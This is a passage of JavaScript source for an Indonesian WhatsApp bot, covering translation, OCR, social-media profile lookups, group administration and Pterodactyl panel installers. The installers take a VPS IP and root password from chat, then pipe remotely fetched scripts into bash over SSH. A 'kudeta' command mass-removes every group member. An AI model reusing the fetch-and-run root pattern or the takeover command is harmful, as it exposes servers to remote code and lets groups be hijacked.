await XPanz.sendMessage(m.chat, {text: `*Data :*\n${dd}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return ArroganzzReply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return ArroganzzReply(example("id good night"))
if (args.length < 1) return ArroganzzReply(example("id good night"))
if (!m.quoted.text) return ArroganzzReply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
ArroganzzReply(result[0])
}
} else {
return ArroganzzReply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return ArroganzzReply(example("dengan kirim/reply foto"))
let foto = await XPanz.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await XPanz.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ocr": {
if (!/image/.test(mime)) return ArroganzzReply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ocr?url=${dd}`)
await XPanz.sendMessage(m.chat, {text: resnya.result.toString()}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "removebg": {
if (!/image/.test(mime)) return ArroganzzReply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/imagecreator/removebg?url=${dd}`)
await XPanz.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokstalk": case "ttstalk": {
if (!text) return ArroganzzReply(example("username"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/tiktok?user=${text}`)
if (!res.status) return ArroganzzReply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.nickname}
* *Username :* ${res.result.uniqueId}
* *Bio :* ${res?.result?.signature || ""}
* *Followers :* ${res.result.followerCount}
* *Following :* ${res.result.followingCount}
* *Private :* ${res.result.privateAccount == true ? "Ya" : "Tidak"}
`
await XPanz.sendMessage(m.chat, {image: {url: res.result.avatarMedium}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "igstalk": {
if (!text) return ArroganzzReply(example("username"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/instagram?user=${text}`)
if (!res.status) return ArroganzzReply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.name}
* *Username :* ${res.result.username}
* *Bio :* ${res.result.bio}
* *Total Postingan :* ${res.result.posts}
* *Followers :* ${res.result.followers}
* *Following :* ${res.result.following}
`
await XPanz.sendMessage(m.chat, {image: {url: res.result.avatar}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytstalk": {
if (!text) return ArroganzzReply(example("username"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/youtube?user=${text}`)
if (!res.status) return ArroganzzReply("Error nama pengguna tidak ditemukan")
res = res.result.channelMetadata
const teks = `
* *Username :* ${res.username}
* *Subscriber :* ${res.subscriberCount}
* *Total Postingan :* ${res.videoCount}
* *Tautan :* ${res.channelUrl}
* *Deskripsi Channel :* ${res.description}
`
await XPanz.sendMessage(m.chat, {image: {url: res.avatarUrl}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await XPanz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return ArroganzzReply("Nomor tidak terdaftar di whatsapp")
const res = await XPanz.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return ArroganzzReply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return ArroganzzReply(JSON.stringify(res, null, 2))
}} else {
return ArroganzzReply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await XPanz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return ArroganzzReply("Nomor tidak terdaftar di whatsapp")
const res = await XPanz.groupParticipantsUpdate(m.chat, [input], 'remove')
await ArroganzzReply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return ArroganzzReply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.isGroup) return ArroganzzReply(mess.group)
await ArroganzzReply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await XPanz.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
await XPanz.groupRevokeInvite(m.chat)
ArroganzzReply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "intro":
ArroganzzReply("۪‹•══════════════\n│          *「 Kartu Intro 」*\n│ *Nama      :* \n│ *Gender   :* \n│ *Umur      :* \n│ *Hobby    :* \n│ *Kelas      :* \n│ *Asal        :* \n╰═══════════ꪶ ")
break

case "tagall": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (!text) return ArroganzzReply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await XPanz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await XPanz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await XPanz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (!text) return ArroganzzReply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await XPanz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return ArroganzzReply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await XPanz.groupAcceptInvite(result)
ArroganzzReply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("https://example.com"))
let data = await fetchJson(text)
ArroganzzReply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text && !m.quoted) return ArroganzzReply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return ArroganzzReply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await XPanz.newsletterMetadata("invite", result)
await XPanz.newsletterFollow(res.id)
ArroganzzReply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return ArroganzzReply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return ArroganzzReply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return ArroganzzReply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return ArroganzzReply("Berhasil mematikan *autoread*")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return ArroganzzReply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return ArroganzzReply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return ArroganzzReply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return ArroganzzReply("Berhasil mematikan *autopromosi*")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return ArroganzzReply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return ArroganzzReply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return ArroganzzReply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return ArroganzzReply("Berhasil mematikan *autotyping*")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return ArroganzzReply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return ArroganzzReply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return ArroganzzReply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return ArroganzzReply("Berhasil mematikan *autoreadsw*")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return ArroganzzReply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return ArroganzzReply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return ArroganzzReply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return ArroganzzReply("Berhasil mematikan *welcome* di grup ini")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return ArroganzzReply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return ArroganzzReply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return ArroganzzReply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return ArroganzzReply("Berhasil mematikan *antilink* di grup ini")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return ArroganzzReply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return ArroganzzReply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return ArroganzzReply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return ArroganzzReply("Berhasil mematikan *antilink2* di grup ini")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return ArroganzzReply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return ArroganzzReply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return ArroganzzReply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return ArroganzzReply("Berhasil mematikan *mute* di grup ini")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return ArroganzzReply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return ArroganzzReply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return ArroganzzReply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return ArroganzzReply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return ArroganzzReply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await XPanz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await XPanz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return ArroganzzReply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return ArroganzzReply("Grup Ini Sudah Tidak Ada Member!")
await ArroganzzReply("Kudeta Grup Starting 🔥")
for (let i of memberFilter) {
await XPanz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await ArroganzzReply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await XPanz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await XPanz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return ArroganzzReply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'smeme': {
    if (!m.quoted) return ArroganzzReply(`Balas gambar dengan perintah:\n${prefix + command} <teks atas>|<teks bawah>`);

    const { Sticker } = require('wa-sticker-formatter');

    async function uguu(filePath) {
        try {
            const form = new FormData();
            form.append('files[]', fs.createReadStream(filePath));
            const { data } = await axios.post('https://uguu.se/upload', form, {
                headers: { ...form.getHeaders() }
            });
            return data.files[0].url;
        } catch (err) {
            throw new Error(err.message);
        }
    }

    async function createSticker(img, url) {
        let stickerMetadata = {
            type: "full",
            pack: "My Sticker",
            author: "© Aroganzz - Botz",
            quality: 100
        };
        return (new Sticker(img || url, stickerMetadata)).toBuffer();
    }

    let [atas, bawah] = text.split('|');
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";

    if (!mime.startsWith('image/')) return ArroganzzReply("❌ Hanya bisa digunakan untuk gambar!");

    await XPanz.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });

    let mediaBuffer = await q.download();
    let ext = mime.split('/')[1] || "png";
    let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
    fs.writeFileSync(tempFile, mediaBuffer);

    try {
        let url = await uguu(tempFile);
        let memeUrl = `https://api.memegen.link/images/custom/${encodeURIComponent(atas || " ")}`
                     + `/${encodeURIComponent(bawah || " ")}.png?background=${url}`;

        let stickerBuffer = await createSticker(memeUrl, false);
        await XPanz.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });

        await XPanz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error(err);
        ArroganzzReply("❌ Terjadi kesalahan saat membuat meme.");
    } finally {
        fs.unlinkSync(tempFile);
    }
}
break

case "uninstalltema": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text || !text.split("|")) return ArroganzzReply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ArroganzzReply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const XPanzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await ArroganzzReply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ArroganzzReply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('XPanzection Error: ' + err);
ArroganzzReply('Katasandi atau IP tidak valid');
}).XPanzect(XPanzSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text || !text.split("|")) return ArroganzzReply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ArroganzzReply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return ArroganzzReply(mess.owner)
if (global.installtema == undefined) return ArroganzzReply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const XPanzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
ArroganzzReply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ArroganzzReply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('XPanzection Error: ' + err);
ArroganzzReply('Katasandi atau IP tidak valid');
}).XPanzect(XPanzSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text || !text.split("|")) return ArroganzzReply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ArroganzzReply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return ArroganzzReply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const XPanzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ArroganzzReply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ArroganzzReply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('XPanzection Error: ' + err);
ArroganzzReply('Katasandi atau IP tidak valid');
}).XPanzect(XPanzSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text || !text.split("|")) return ArroganzzReply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ArroganzzReply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return ArroganzzReply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const XPanzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ArroganzzReply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ArroganzzReply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('XPanzection Error: ' + err);
ArroganzzReply('Katasandi atau IP tidak valid');
}).XPanzect(XPanzSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return ArroganzzReply(msg.owner);
if (!text || !text.split("|")) return ArroganzzReply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return ArroganzzReply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const XPanzSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await ArroganzzReply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ArroganzzReply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
ArroganzzReply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
ArroganzzReply('STDERR: ' + data);
});
});
}).on('error', (err) => {
ArroganzzReply('Katasandi atau IP tidak valid')
}).XPanzect(XPanzSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return ArroganzzReply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const XPanzSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await XPanz.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
